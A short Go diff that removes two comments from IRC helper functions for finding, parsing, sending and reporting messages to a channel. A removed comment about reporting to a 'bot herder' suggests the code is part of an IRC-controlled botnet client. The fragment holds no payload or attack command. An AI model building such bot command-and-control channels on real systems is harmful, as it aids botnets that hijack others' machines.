@@ -24,10 +24,8 @@ func IRC_Find(read, msg string) bool { return strings.Contains(read, msg) }
 
 func IRC_Recv(cmd string, arg int) string { return strings.Split(cmd, " ")[arg] }
 
-//For interact with IRC backend
 func IRC_Send(sendIRC net.Conn, data string) { fmt.Fprintf(sendIRC, "%s\r\n", data) }
 
-//For interact with bot herder //More Easy to Read
 func IRC_Report(set_serv net.Conn, set_chan, msg string) {
 	IRC_Send(set_serv, "PRIVMSG "+set_chan+" :"+msg)
 }
